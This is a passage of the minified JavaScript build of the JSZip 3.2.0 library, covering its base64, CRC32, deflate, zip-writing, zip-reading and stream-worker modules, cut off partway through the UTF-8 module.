!function(t){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=t();else if("function"==typeof define&&define.amd)define([],t);else{("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).JSZip=t()}}(function(){return function s(a,o,h){function u(r,t){if(!o[r]){if(!a[r]){var e="function"==typeof require&&require;if(!t&&e)return e(r,!0);if(l)return l(r,!0);var i=new Error("Cannot find module '"+r+"'");throw i.code="MODULE_NOT_FOUND",i}var n=o[r]={exports:{}};a[r][0].call(n.exports,function(t){var e=a[r][1][t];return u(e||t)},n,n.exports,s,a,o,h)}return o[r].exports}for(var l="function"==typeof require&&require,t=0;t<h.length;t++)u(h[t]);return u}({1:[function(t,e,r){"use strict";var c=t("./utils"),d=t("./support"),p="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";r.encode=function(t){for(var e,r,i,n,s,a,o,h=[],u=0,l=t.length,f=l,d="string"!==c.getTypeOf(t);u<t.length;)f=l-u,i=d?(e=t[u++],r=u<l?t[u++]:0,u<l?t[u++]:0):(e=t.charCodeAt(u++),r=u<l?t.charCodeAt(u++):0,u<l?t.charCodeAt(u++):0),n=e>>2,s=(3&e)<<4|r>>4,a=1<f?(15&r)<<2|i>>6:64,o=2<f?63&i:64,h.push(p.charAt(n)+p.charAt(s)+p.charAt(a)+p.charAt(o));return h.join("")},r.decode=function(t){var e,r,i,n,s,a,o=0,h=0,u="data:";if(t.substr(0,u.length)===u)throw new Error("Invalid base64 input, it looks like a data url.");var l,f=3*(t=t.replace(/[^A-Za-z0-9\+\/\=]/g,"")).length/4;if(t.charAt(t.length-1)===p.charAt(64)&&f--,t.charAt(t.length-2)===p.charAt(64)&&f--,f%1!=0)throw new Error("Invalid base64 input, bad content length.");for(l=d.uint8array?new Uint8Array(0|f):new Array(0|f);o<t.length;)e=p.indexOf(t.charAt(o++))<<2|(n=p.indexOf(t.charAt(o++)))>>4,r=(15&n)<<4|(s=p.indexOf(t.charAt(o++)))>>2,i=(3&s)<<6|(a=p.indexOf(t.charAt(o++))),l[h++]=e,64!==s&&(l[h++]=r),64!==a&&(l[h++]=i);return l}},{"./support":30,"./utils":32}],2:[function(t,e,r){"use strict";var i=t("./external"),n=t("./stream/DataWorker"),s=t("./stream/DataLengthProbe"),a=t("./stream/Crc32Probe");s=t("./stream/DataLengthProbe");function o(t,e,r,i,n){this.compressedSize=t,this.uncompressedSize=e,this.crc32=r,this.compression=i,this.compressedContent=n}o.prototype={getContentWorker:function(){var t=new n(i.Promise.resolve(this.compressedContent)).pipe(this.compression.uncompressWorker()).pipe(new s("data_length")),e=this;return t.on("end",function(){if(this.streamInfo.data_length!==e.uncompressedSize)throw new Error("Bug : uncompressed data size mismatch")}),t},getCompressedWorker:function(){return new n(i.Promise.resolve(this.compressedContent)).withStreamInfo("compressedSize",this.compressedSize).withStreamInfo("uncompressedSize",this.uncompressedSize).withStreamInfo("crc32",this.crc32).withStreamInfo("compression",this.compression)}},o.createWorkerFrom=function(t,e,r){return t.pipe(new a).pipe(new s("uncompressedSize")).pipe(e.compressWorker(r)).pipe(new s("compressedSize")).withStreamInfo("compression",e)},e.exports=o},{"./external":6,"./stream/Crc32Probe":25,"./stream/DataLengthProbe":26,"./stream/DataWorker":27}],3:[function(t,e,r){"use strict";var i=t("./stream/GenericWorker");r.STORE={magic:"\0\0",compressWorker:function(t){return new i("STORE compression")},uncompressWorker:function(){return new i("STORE decompression")}},r.DEFLATE=t("./flate")},{"./flate":7,"./stream/GenericWorker":28}],4:[function(t,e,r){"use strict";var i=t("./utils");var o=function(){for(var t,e=[],r=0;r<256;r++){t=r;for(var i=0;i<8;i++)t=1&t?3988292384^t>>>1:t>>>1;e[r]=t}return e}();e.exports=function(t,e){return void 0!==t&&t.length?"string"!==i.getTypeOf(t)?function(t,e,r,i){var n=o,s=i+r;t^=-1;for(var a=i;a<s;a++)t=t>>>8^n[255&(t^e[a])];return-1^t}(0|e,t,t.length,0):function(t,e,r,i){var n=o,s=i+r;t^=-1;for(var a=i;a<s;a++)t=t>>>8^n[255&(t^e.charCodeAt(a))];return-1^t}(0|e,t,t.length,0):0}},{"./utils":32}],5:[function(t,e,r){"use strict";r.base64=!1,r.binary=!1,r.dir=!1,r.createFolders=!0,r.date=null,r.compression=null,r.compressionOptions=null,r.comment=null,r.unixPermissions=null,r.dosPermissions=null},{}],6:[function(t,e,r){"use strict";var i=null;i="undefined"!=typeof Promise?Promise:t("lie"),e.exports={Promise:i}},{lie:37}],7:[function(t,e,r){"use strict";var i="undefined"!=typeof Uint8Array&&"undefined"!=typeof Uint16Array&&"undefined"!=typeof Uint32Array,n=t("pako"),s=t("./utils"),a=t("./stream/GenericWorker"),o=i?"uint8array":"array";function h(t,e){a.call(this,"FlateWorker/"+t),this._pako=null,this._pakoAction=t,this._pakoOptions=e,this.meta={}}r.magic="\b\0",s.inherits(h,a),h.prototype.processChunk=function(t){this.meta=t.meta,null===this._pako&&this._createPako(),this._pako.push(s.transformTo(o,t.data),!1)},h.prototype.flush=function(){a.prototype.flush.call(this),null===this._pako&&this._createPako(),this._pako.push([],!0)},h.prototype.cleanUp=function(){a.prototype.cleanUp.call(this),this._pako=null},h.prototype._createPako=function(){this._pako=new n[this._pakoAction]({raw:!0,level:this._pakoOptions.level||-1});var e=this;this._pako.onData=function(t){e.push({data:t,meta:e.meta})}},r.compressWorker=function(t){return new h("Deflate",t)},r.uncompressWorker=function(){return new h("Inflate",{})}},{"./stream/GenericWorker":28,"./utils":32,pako:38}],8:[function(t,e,r){"use strict";function A(t,e){var r,i="";for(r=0;r<e;r++)i+=String.fromCharCode(255&t),t>>>=8;return i}function i(t,e,r,i,n,s){var a,o,h=t.file,u=t.compression,l=s!==O.utf8encode,f=I.transformTo("string",s(h.name)),d=I.transformTo("string",O.utf8encode(h.name)),c=h.comment,p=I.transformTo("string",s(c)),m=I.transformTo("string",O.utf8encode(c)),_=d.length!==h.name.length,g=m.length!==c.length,b="",v="",y="",w=h.dir,k=h.date,x={crc32:0,compressedSize:0,uncompressedSize:0};e&&!r||(x.crc32=t.crc32,x.compressedSize=t.compressedSize,x.uncompressedSize=t.uncompressedSize);var S=0;e&&(S|=8),l||!_&&!g||(S|=2048);var z=0,C=0;w&&(z|=16),"UNIX"===n?(C=798,z|=function(t,e){var r=t;return t||(r=e?16893:33204),(65535&r)<<16}(h.unixPermissions,w)):(C=20,z|=function(t){return 63&(t||0)}(h.dosPermissions)),a=k.getUTCHours(),a<<=6,a|=k.getUTCMinutes(),a<<=5,a|=k.getUTCSeconds()/2,o=k.getUTCFullYear()-1980,o<<=4,o|=k.getUTCMonth()+1,o<<=5,o|=k.getUTCDate(),_&&(v=A(1,1)+A(B(f),4)+d,b+="up"+A(v.length,2)+v),g&&(y=A(1,1)+A(B(p),4)+m,b+="uc"+A(y.length,2)+y);var E="";return E+="\n\0",E+=A(S,2),E+=u.magic,E+=A(a,2),E+=A(o,2),E+=A(x.crc32,4),E+=A(x.compressedSize,4),E+=A(x.uncompressedSize,4),E+=A(f.length,2),E+=A(b.length,2),{fileRecord:R.LOCAL_FILE_HEADER+E+f+b,dirRecord:R.CENTRAL_FILE_HEADER+A(C,2)+E+A(p.length,2)+"\0\0\0\0"+A(z,4)+A(i,4)+f+b+p}}var I=t("../utils"),n=t("../stream/GenericWorker"),O=t("../utf8"),B=t("../crc32"),R=t("../signature");function s(t,e,r,i){n.call(this,"ZipFileWorker"),this.bytesWritten=0,this.zipComment=e,this.zipPlatform=r,this.encodeFileName=i,this.streamFiles=t,this.accumulate=!1,this.contentBuffer=[],this.dirRecords=[],this.currentSourceOffset=0,this.entriesCount=0,this.currentFile=null,this._sources=[]}I.inherits(s,n),s.prototype.push=function(t){var e=t.meta.percent||0,r=this.entriesCount,i=this._sources.length;this.accumulate?this.contentBuffer.push(t):(this.bytesWritten+=t.data.length,n.prototype.push.call(this,{data:t.data,meta:{currentFile:this.currentFile,percent:r?(e+100*(r-i-1))/r:100}}))},s.prototype.openedSource=function(t){this.currentSourceOffset=this.bytesWritten,this.currentFile=t.file.name;var e=this.streamFiles&&!t.file.dir;if(e){var r=i(t,e,!1,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);this.push({data:r.fileRecord,meta:{percent:0}})}else this.accumulate=!0},s.prototype.closedSource=function(t){this.accumulate=!1;var e=this.streamFiles&&!t.file.dir,r=i(t,e,!0,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);if(this.dirRecords.push(r.dirRecord),e)this.push({data:function(t){return R.DATA_DESCRIPTOR+A(t.crc32,4)+A(t.compressedSize,4)+A(t.uncompressedSize,4)}(t),meta:{percent:100}});else for(this.push({data:r.fileRecord,meta:{percent:0}});this.contentBuffer.length;)this.push(this.contentBuffer.shift());this.currentFile=null},s.prototype.flush=function(){for(var t=this.bytesWritten,e=0;e<this.dirRecords.length;e++)this.push({data:this.dirRecords[e],meta:{percent:100}});var r=this.bytesWritten-t,i=function(t,e,r,i,n){var s=I.transformTo("string",n(i));return R.CENTRAL_DIRECTORY_END+"\0\0\0\0"+A(t,2)+A(t,2)+A(e,4)+A(r,4)+A(s.length,2)+s}(this.dirRecords.length,r,t,this.zipComment,this.encodeFileName);this.push({data:i,meta:{percent:100}})},s.prototype.prepareNextSource=function(){this.previous=this._sources.shift(),this.openedSource(this.previous.streamInfo),this.isPaused?this.previous.pause():this.previous.resume()},s.prototype.registerPrevious=function(t){this._sources.push(t);var e=this;return t.on("data",function(t){e.processChunk(t)}),t.on("end",function(){e.closedSource(e.previous.streamInfo),e._sources.length?e.prepareNextSource():e.end()}),t.on("error",function(t){e.error(t)}),this},s.prototype.resume=function(){return!!n.prototype.resume.call(this)&&(!this.previous&&this._sources.length?(this.prepareNextSource(),!0):this.previous||this._sources.length||this.generatedError?void 0:(this.end(),!0))},s.prototype.error=function(t){var e=this._sources;if(!n.prototype.error.call(this,t))return!1;for(var r=0;r<e.length;r++)try{e[r].error(t)}catch(t){}return!0},s.prototype.lock=function(){n.prototype.lock.call(this);for(var t=this._sources,e=0;e<t.length;e++)t[e].lock()},e.exports=s},{"../crc32":4,"../signature":23,"../stream/GenericWorker":28,"../utf8":31,"../utils":32}],9:[function(t,e,r){"use strict";var u=t("../compressions"),i=t("./ZipFileWorker");r.generateWorker=function(t,a,e){var o=new i(a.streamFiles,e,a.platform,a.encodeFileName),h=0;try{t.forEach(function(t,e){h++;var r=function(t,e){var r=t||e,i=u[r];if(!i)throw new Error(r+" is not a valid compression method !");return i}(e.options.compression,a.compression),i=e.options.compressionOptions||a.compressionOptions||{},n=e.dir,s=e.date;e._compressWorker(r,i).withStreamInfo("file",{name:t,dir:n,date:s,comment:e.comment||"",unixPermissions:e.unixPermissions,dosPermissions:e.dosPermissions}).pipe(o)}),o.entriesCount=h}catch(t){o.error(t)}return o}},{"../compressions":3,"./ZipFileWorker":8}],10:[function(t,e,r){"use strict";function i(){if(!(this instanceof i))return new i;if(arguments.length)throw new Error("The constructor with parameters has been removed in JSZip 3.0, please check the upgrade guide.");this.files={},this.comment=null,this.root="",this.clone=function(){var t=new i;for(var e in this)"function"!=typeof this[e]&&(t[e]=this[e]);return t}}(i.prototype=t("./object")).loadAsync=t("./load"),i.support=t("./support"),i.defaults=t("./defaults"),i.version="3.2.0",i.loadAsync=function(t,e){return(new i).loadAsync(t,e)},i.external=t("./external"),e.exports=i},{"./defaults":5,"./external":6,"./load":11,"./object":15,"./support":30}],11:[function(t,e,r){"use strict";var i=t("./utils"),n=t("./external"),o=t("./utf8"),h=(i=t("./utils"),t("./zipEntries")),s=t("./stream/Crc32Probe"),u=t("./nodejsUtils");function l(i){return new n.Promise(function(t,e){var r=i.decompressed.getContentWorker().pipe(new s);r.on("error",function(t){e(t)}).on("end",function(){r.streamInfo.crc32!==i.decompressed.crc32?e(new Error("Corrupted zip : CRC32 mismatch")):t()}).resume()})}e.exports=function(t,s){var a=this;return s=i.extend(s||{},{base64:!1,checkCRC32:!1,optimizedBinaryString:!1,createFolders:!1,decodeFileName:o.utf8decode}),u.isNode&&u.isStream(t)?n.Promise.reject(new Error("JSZip can't accept a stream when loading a zip file.")):i.prepareContent("the loaded zip file",t,!0,s.optimizedBinaryString,s.base64).then(function(t){var e=new h(s);return e.load(t),e}).then(function(t){var e=[n.Promise.resolve(t)],r=t.files;if(s.checkCRC32)for(var i=0;i<r.length;i++)e.push(l(r[i]));return n.Promise.all(e)}).then(function(t){for(var e=t.shift(),r=e.files,i=0;i<r.length;i++){var n=r[i];a.file(n.fileNameStr,n.decompressed,{binary:!0,optimizedBinaryString:!0,date:n.date,dir:n.dir,comment:n.fileCommentStr.length?n.fileCommentStr:null,unixPermissions:n.unixPermissions,dosPermissions:n.dosPermissions,createFolders:s.createFolders})}return e.zipComment.length&&(a.comment=e.zipComment),a})}},{"./external":6,"./nodejsUtils":14,"./stream/Crc32Probe":25,"./utf8":31,"./utils":32,"./zipEntries":33}],12:[function(t,e,r){"use strict";var i=t("../utils"),n=t("../stream/GenericWorker");function s(t,e){n.call(this,"Nodejs stream input adapter for "+t),this._upstreamEnded=!1,this._bindStream(e)}i.inherits(s,n),s.prototype._bindStream=function(t){var e=this;(this._stream=t).pause(),t.on("data",function(t){e.push({data:t,meta:{percent:0}})}).on("error",function(t){e.isPaused?this.generatedError=t:e.error(t)}).on("end",function(){e.isPaused?e._upstreamEnded=!0:e.end()})},s.prototype.pause=function(){return!!n.prototype.pause.call(this)&&(this._stream.pause(),!0)},s.prototype.resume=function(){return!!n.prototype.resume.call(this)&&(this._upstreamEnded?this.end():this._stream.resume(),!0)},e.exports=s},{"../stream/GenericWorker":28,"../utils":32}],13:[function(t,e,r){"use strict";var n=t("readable-stream").Readable;function i(t,e,r){n.call(this,e),this._helper=t;var i=this;t.on("data",function(t,e){i.push(t)||i._helper.pause(),r&&r(e)}).on("error",function(t){i.emit("error",t)}).on("end",function(){i.push(null)})}t("../utils").inherits(i,n),i.prototype._read=function(){this._helper.resume()},e.exports=i},{"../utils":32,"readable-stream":16}],14:[function(t,e,r){"use strict";e.exports={isNode:"undefined"!=typeof Buffer,newBufferFrom:function(t,e){if(Buffer.from&&Buffer.from!==Uint8Array.from)return Buffer.from(t,e);if("number"==typeof t)throw new Error('The "data" argument must not be a number');return new Buffer(t,e)},allocBuffer:function(t){if(Buffer.alloc)return Buffer.alloc(t);var e=new Buffer(t);return e.fill(0),e},isBuffer:function(t){return Buffer.isBuffer(t)},isStream:function(t){return t&&"function"==typeof t.on&&"function"==typeof t.pause&&"function"==typeof t.resume}}},{}],15:[function(t,e,r){"use strict";function s(t,e,r){var i,n=u.getTypeOf(e),s=u.extend(r||{},f);s.date=s.date||new Date,null!==s.compression&&(s.compression=s.compression.toUpperCase()),"string"==typeof s.unixPermissions&&(s.unixPermissions=parseInt(s.unixPermissions,8)),s.unixPermissions&&16384&s.unixPermissions&&(s.dir=!0),s.dosPermissions&&16&s.dosPermissions&&(s.dir=!0),s.dir&&(t=g(t)),s.createFolders&&(i=_(t))&&b.call(this,i,!0);var a="string"===n&&!1===s.binary&&!1===s.base64;r&&void 0!==r.binary||(s.binary=!a),(e instanceof d&&0===e.uncompressedSize||s.dir||!e||0===e.length)&&(s.base64=!1,s.binary=!0,e="",s.compression="STORE",n="string");var o=null;o=e instanceof d||e instanceof l?e:p.isNode&&p.isStream(e)?new m(t,e):u.prepareContent(t,e,s.binary,s.optimizedBinaryString,s.base64);var h=new c(t,o,s);this.files[t]=h}var n=t("./utf8"),u=t("./utils"),l=t("./stream/GenericWorker"),a=t("./stream/StreamHelper"),f=t("./defaults"),d=t("./compressedObject"),c=t("./zipObject"),o=t("./generate"),p=t("./nodejsUtils"),m=t("./nodejs/NodejsStreamInputAdapter"),_=function(t){"/"===t.slice(-1)&&(t=t.substring(0,t.length-1));var e=t.lastIndexOf("/");return 0<e?t.substring(0,e):""},g=function(t){return"/"!==t.slice(-1)&&(t+="/"),t},b=function(t,e){return e=void 0!==e?e:f.createFolders,t=g(t),this.files[t]||s.call(this,t,null,{dir:!0,createFolders:e}),this.files[t]};function h(t){return"[object RegExp]"===Object.prototype.toString.call(t)}var i={load:function(){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},forEach:function(t){var e,r,i;for(e in this.files)this.files.hasOwnProperty(e)&&(i=this.files[e],(r=e.slice(this.root.length,e.length))&&e.slice(0,this.root.length)===this.root&&t(r,i))},filter:function(r){var i=[];return this.forEach(function(t,e){r(t,e)&&i.push(e)}),i},file:function(t,e,r){if(1!==arguments.length)return t=this.root+t,s.call(this,t,e,r),this;if(h(t)){var i=t;return this.filter(function(t,e){return!e.dir&&i.test(t)})}var n=this.files[this.root+t];return n&&!n.dir?n:null},folder:function(r){if(!r)return this;if(h(r))return this.filter(function(t,e){return e.dir&&r.test(t)});var t=this.root+r,e=b.call(this,t),i=this.clone();return i.root=e.name,i},remove:function(r){r=this.root+r;var t=this.files[r];if(t||("/"!==r.slice(-1)&&(r+="/"),t=this.files[r]),t&&!t.dir)delete this.files[r];else for(var e=this.filter(function(t,e){return e.name.slice(0,r.length)===r}),i=0;i<e.length;i++)delete this.files[e[i].name];return this},generate:function(t){throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.")},generateInternalStream:function(t){var e,r={};try{if((r=u.extend(t||{},{streamFiles:!1,compression:"STORE",compressionOptions:null,type:"",platform:"DOS",comment:null,mimeType:"application/zip",encodeFileName:n.utf8encode})).type=r.type.toLowerCase(),r.compression=r.compression.toUpperCase(),"binarystring"===r.type&&(r.type="string"),!r.type)throw new Error("No output type specified.");u.checkSupport(r.type),"darwin"!==r.platform&&"freebsd"!==r.platform&&"linux"!==r.platform&&"sunos"!==r.platform||(r.platform="UNIX"),"win32"===r.platform&&(r.platform="DOS");var i=r.comment||this.comment||"";e=o.generateWorker(this,r,i)}catch(t){(e=new l("error")).error(t)}return new a(e,r.type||"string",r.mimeType)},generateAsync:function(t,e){return this.generateInternalStream(t).accumulate(e)},generateNodeStream:function(t,e){return(t=t||{}).type||(t.type="nodebuffer"),this.generateInternalStream(t).toNodejsStream(e)}};e.exports=i},{"./compressedObject":2,"./defaults":5,"./generate":9,"./nodejs/NodejsStreamInputAdapter":12,"./nodejsUtils":14,"./stream/GenericWorker":28,"./stream/StreamHelper":29,"./utf8":31,"./utils":32,"./zipObject":35}],16:[function(t,e,r){e.exports=t("stream")},{stream:void 0}],17:[function(t,e,r){"use strict";var i=t("./DataReader");function n(t){i.call(this,t);for(var e=0;e<this.data.length;e++)t[e]=255&t[e]}t("../utils").inherits(n,i),n.prototype.byteAt=function(t){return this.data[this.zero+t]},n.prototype.lastIndexOfSignature=function(t){for(var e=t.charCodeAt(0),r=t.charCodeAt(1),i=t.charCodeAt(2),n=t.charCodeAt(3),s=this.length-4;0<=s;--s)if(this.data[s]===e&&this.data[s+1]===r&&this.data[s+2]===i&&this.data[s+3]===n)return s-this.zero;return-1},n.prototype.readAndCheckSignature=function(t){var e=t.charCodeAt(0),r=t.charCodeAt(1),i=t.charCodeAt(2),n=t.charCodeAt(3),s=this.readData(4);return e===s[0]&&r===s[1]&&i===s[2]&&n===s[3]},n.prototype.readData=function(t){if(this.checkOffset(t),0===t)return[];var e=this.data.slice(this.zero+this.index,this.zero+this.index+t);return this.index+=t,e},e.exports=n},{"../utils":32,"./DataReader":18}],18:[function(t,e,r){"use strict";var i=t("../utils");function n(t){this.data=t,this.length=t.length,this.index=0,this.zero=0}n.prototype={checkOffset:function(t){this.checkIndex(this.index+t)},checkIndex:function(t){if(this.length<this.zero+t||t<0)throw new Error("End of data reached (data length = "+this.length+", asked index = "+t+"). Corrupted zip ?")},setIndex:function(t){this.checkIndex(t),this.index=t},skip:function(t){this.setIndex(this.index+t)},byteAt:function(t){},readInt:function(t){var e,r=0;for(this.checkOffset(t),e=this.index+t-1;e>=this.index;e--)r=(r<<8)+this.byteAt(e);return this.index+=t,r},readString:function(t){return i.transformTo("string",this.readData(t))},readData:function(t){},lastIndexOfSignature:function(t){},readAndCheckSignature:function(t){},readDate:function(){var t=this.readInt(4);return new Date(Date.UTC(1980+(t>>25&127),(t>>21&15)-1,t>>16&31,t>>11&31,t>>5&63,(31&t)<<1))}},e.exports=n},{"../utils":32}],19:[function(t,e,r){"use strict";var i=t("./Uint8ArrayReader");function n(t){i.call(this,t)}t("../utils").inherits(n,i),n.prototype.readData=function(t){this.checkOffset(t);var e=this.data.slice(this.zero+this.index,this.zero+this.index+t);return this.index+=t,e},e.exports=n},{"../utils":32,"./Uint8ArrayReader":21}],20:[function(t,e,r){"use strict";var i=t("./DataReader");function n(t){i.call(this,t)}t("../utils").inherits(n,i),n.prototype.byteAt=function(t){return this.data.charCodeAt(this.zero+t)},n.prototype.lastIndexOfSignature=function(t){return this.data.lastIndexOf(t)-this.zero},n.prototype.readAndCheckSignature=function(t){return t===this.readData(4)},n.prototype.readData=function(t){this.checkOffset(t);var e=this.data.slice(this.zero+this.index,this.zero+this.index+t);return this.index+=t,e},e.exports=n},{"../utils":32,"./DataReader":18}],21:[function(t,e,r){"use strict";var i=t("./ArrayReader");function n(t){i.call(this,t)}t("../utils").inherits(n,i),n.prototype.readData=function(t){if(this.checkOffset(t),0===t)return new Uint8Array(0);var e=this.data.subarray(this.zero+this.index,this.zero+this.index+t);return this.index+=t,e},e.exports=n},{"../utils":32,"./ArrayReader":17}],22:[function(t,e,r){"use strict";var i=t("../utils"),n=t("../support"),s=t("./ArrayReader"),a=t("./StringReader"),o=t("./NodeBufferReader"),h=t("./Uint8ArrayReader");e.exports=function(t){var e=i.getTypeOf(t);return i.checkSupport(e),"string"!==e||n.uint8array?"nodebuffer"===e?new o(t):n.uint8array?new h(i.transformTo("uint8array",t)):new s(i.transformTo("array",t)):new a(t)}},{"../support":30,"../utils":32,"./ArrayReader":17,"./NodeBufferReader":19,"./StringReader":20,"./Uint8ArrayReader":21}],23:[function(t,e,r){"use strict";r.LOCAL_FILE_HEADER="PK",r.CENTRAL_FILE_HEADER="PK",r.CENTRAL_DIRECTORY_END="PK",r.ZIP64_CENTRAL_DIRECTORY_LOCATOR="PK",r.ZIP64_CENTRAL_DIRECTORY_END="PK",r.DATA_DESCRIPTOR="PK\b"},{}],24:[function(t,e,r){"use strict";var i=t("./GenericWorker"),n=t("../utils");function s(t){i.call(this,"ConvertWorker to "+t),this.destType=t}n.inherits(s,i),s.prototype.processChunk=function(t){this.push({data:n.transformTo(this.destType,t.data),meta:t.meta})},e.exports=s},{"../utils":32,"./GenericWorker":28}],25:[function(t,e,r){"use strict";var i=t("./GenericWorker"),n=t("../crc32");function s(){i.call(this,"Crc32Probe"),this.withStreamInfo("crc32",0)}t("../utils").inherits(s,i),s.prototype.processChunk=function(t){this.streamInfo.crc32=n(t.data,this.streamInfo.crc32||0),this.push(t)},e.exports=s},{"../crc32":4,"../utils":32,"./GenericWorker":28}],26:[function(t,e,r){"use strict";var i=t("../utils"),n=t("./GenericWorker");function s(t){n.call(this,"DataLengthProbe for "+t),this.propName=t,this.withStreamInfo(t,0)}i.inherits(s,n),s.prototype.processChunk=function(t){if(t){var e=this.streamInfo[this.propName]||0;this.streamInfo[this.propName]=e+t.data.length}n.prototype.processChunk.call(this,t)},e.exports=s},{"../utils":32,"./GenericWorker":28}],27:[function(t,e,r){"use strict";var i=t("../utils"),n=t("./GenericWorker");function s(t){n.call(this,"DataWorker");var e=this;this.dataIsReady=!1,this.index=0,this.max=0,this.data=null,this.type="",this._tickScheduled=!1,t.then(function(t){e.dataIsReady=!0,e.data=t,e.max=t&&t.length||0,e.type=i.getTypeOf(t),e.isPaused||e._tickAndRepeat()},function(t){e.error(t)})}i.inherits(s,n),s.prototype.cleanUp=function(){n.prototype.cleanUp.call(this),this.data=null},s.prototype.resume=function(){return!!n.prototype.resume.call(this)&&(!this._tickScheduled&&this.dataIsReady&&(this._tickScheduled=!0,i.delay(this._tickAndRepeat,[],this)),!0)},s.prototype._tickAndRepeat=function(){this._tickScheduled=!1,this.isPaused||this.isFinished||(this._tick(),this.isFinished||(i.delay(this._tickAndRepeat,[],this),this._tickScheduled=!0))},s.prototype._tick=function(){if(this.isPaused||this.isFinished)return!1;var t=null,e=Math.min(this.max,this.index+16384);if(this.index>=this.max)return this.end();switch(this.type){case"string":t=this.data.substring(this.index,e);break;case"uint8array":t=this.data.subarray(this.index,e);break;case"array":case"nodebuffer":t=this.data.slice(this.index,e)}return this.index=e,this.push({data:t,meta:{percent:this.max?this.index/this.max*100:0}})},e.exports=s},{"../utils":32,"./GenericWorker":28}],28:[function(t,e,r){"use strict";function i(t){this.name=t||"default",this.streamInfo={},this.generatedError=null,this.extraStreamInfo={},this.isPaused=!0,this.isFinished=!1,this.isLocked=!1,this._listeners={data:[],end:[],error:[]},this.previous=null}i.prototype={push:function(t){this.emit("data",t)},end:function(){if(this.isFinished)return!1;this.flush();try{this.emit("end"),this.cleanUp(),this.isFinished=!0}catch(t){this.emit("error",t)}return!0},error:function(t){return!this.isFinished&&(this.isPaused?this.generatedError=t:(this.isFinished=!0,this.emit("error",t),this.previous&&this.previous.error(t),this.cleanUp()),!0)},on:function(t,e){return this._listeners[t].push(e),this},cleanUp:function(){this.streamInfo=this.generatedError=this.extraStreamInfo=null,this._listeners=[]},emit:function(t,e){if(this._listeners[t])for(var r=0;r<this._listeners[t].length;r++)this._listeners[t][r].call(this,e)},pipe:function(t){return t.registerPrevious(this)},registerPrevious:function(t){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.streamInfo=t.streamInfo,this.mergeStreamInfo(),this.previous=t;var e=this;return t.on("data",function(t){e.processChunk(t)}),t.on("end",function(){e.end()}),t.on("error",function(t){e.error(t)}),this},pause:function(){return!this.isPaused&&!this.isFinished&&(this.isPaused=!0,this.previous&&this.previous.pause(),!0)},resume:function(){if(!this.isPaused||this.isFinished)return!1;var t=this.isPaused=!1;return this.generatedError&&(this.error(this.generatedError),t=!0),this.previous&&this.previous.resume(),!t},flush:function(){},processChunk:function(t){this.push(t)},withStreamInfo:function(t,e){return this.extraStreamInfo[t]=e,this.mergeStreamInfo(),this},mergeStreamInfo:function(){for(var t in this.extraStreamInfo)this.extraStreamInfo.hasOwnProperty(t)&&(this.streamInfo[t]=this.extraStreamInfo[t])},lock:function(){if(this.isLocked)throw new Error("The stream '"+this+"' has already been used.");this.isLocked=!0,this.previous&&this.previous.lock()},toString:function(){var t="Worker "+this.name;return this.previous?this.previous+" -> "+t:t}},e.exports=i},{}],29:[function(t,e,r){"use strict";var h=t("../utils"),n=t("./ConvertWorker"),s=t("./GenericWorker"),u=t("../base64"),i=t("../support"),a=t("../external"),o=null;if(i.nodestream)try{o=t("../nodejs/NodejsStreamOutputAdapter")}catch(t){}function l(t,o){return new a.Promise(function(e,r){var i=[],n=t._internalType,s=t._outputType,a=t._mimeType;t.on("data",function(t,e){i.push(t),o&&o(e)}).on("error",function(t){i=[],r(t)}).on("end",function(){try{var t=function(t,e,r){switch(t){case"blob":return h.newBlob(h.transformTo("arraybuffer",e),r);case"base64":return u.encode(e);default:return h.transformTo(t,e)}}(s,function(t,e){var r,i=0,n=null,s=0;for(r=0;r<e.length;r++)s+=e[r].length;switch(t){case"string":return e.join("");case"array":return Array.prototype.concat.apply([],e);case"uint8array":for(n=new Uint8Array(s),r=0;r<e.length;r++)n.set(e[r],i),i+=e[r].length;return n;case"nodebuffer":return Buffer.concat(e);default:throw new Error("concat : unsupported type '"+t+"'")}}(n,i),a);e(t)}catch(t){r(t)}i=[]}).resume()})}function f(t,e,r){var i=e;switch(e){case"blob":case"arraybuffer":i="uint8array";break;case"base64":i="string"}try{this._internalType=i,this._outputType=e,this._mimeType=r,h.checkSupport(i),this._worker=t.pipe(new n(i)),t.lock()}catch(t){this._worker=new s("error"),this._worker.error(t)}}f.prototype={accumulate:function(t){return l(this,t)},on:function(t,e){var r=this;return"data"===t?this._worker.on(t,function(t){e.call(r,t.data,t.meta)}):this._worker.on(t,function(){h.delay(e,arguments,r)}),this},resume:function(){return h.delay(this._worker.resume,[],this._worker),this},pause:function(){return this._worker.pause(),this},toNodejsStream:function(t){if(h.checkSupport("nodestream"),"nodebuffer"!==this._outputType)throw new Error(this._outputType+" is not supported by this method");return new o(this,{objectMode:"nodebuffer"!==this._outputType},t)}},e.exports=f},{"../base64":1,"../external":6,"../nodejs/NodejsStreamOutputAdapter":13,"../support":30,"../utils":32,"./ConvertWorker":24,"./GenericWorker":28}],30:[function(t,e,r){"use strict";if(r.base64=!0,r.array=!0,r.string=!0,r.arraybuffer="undefined"!=typeof ArrayBuffer&&"undefined"!=typeof Uint8Array,r.nodebuffer="undefined"!=typeof Buffer,r.uint8array="undefined"!=typeof Uint8Array,"undefined"==typeof ArrayBuffer)r.blob=!1;else{var i=new ArrayBuffer(0);try{r.blob=0===new Blob([i],{type:"application/zip"}).size}catch(t){try{var n=new(self.BlobBuilder||self.WebKitBlobBuilder||self.MozBlobBuilder||self.MSBlobBuilder);n.append(i),r.blob=0===n.getBlob("application/zip").size}catch(t){r.blob=!1}}}try{r.nodestream=!!t("readable-stream").Readable}catch(t){r.nodestream=!1}},{"readable-stream":16}],31:[function(t,e,s){"use strict";for(var o=t("./utils"),h=t("./support"),r=t("./nodejsUtils"),i=t("./stream/GenericWorker"),u=new Array(256),n=0;n<256;n++)u[n]=252<=n?6:248<=n?5:240<=n?4:224<=n?3:192<=n?2:1;u[254]=u[254]=1;function a(){i.call(this,"utf-8 decode"),this.leftOver=null}function l(){i.call(this,"utf-8 encode")}s.utf8encode=function(t){return h.nodebuffer?r.newBufferFrom(t,"utf-8"):function(t){var 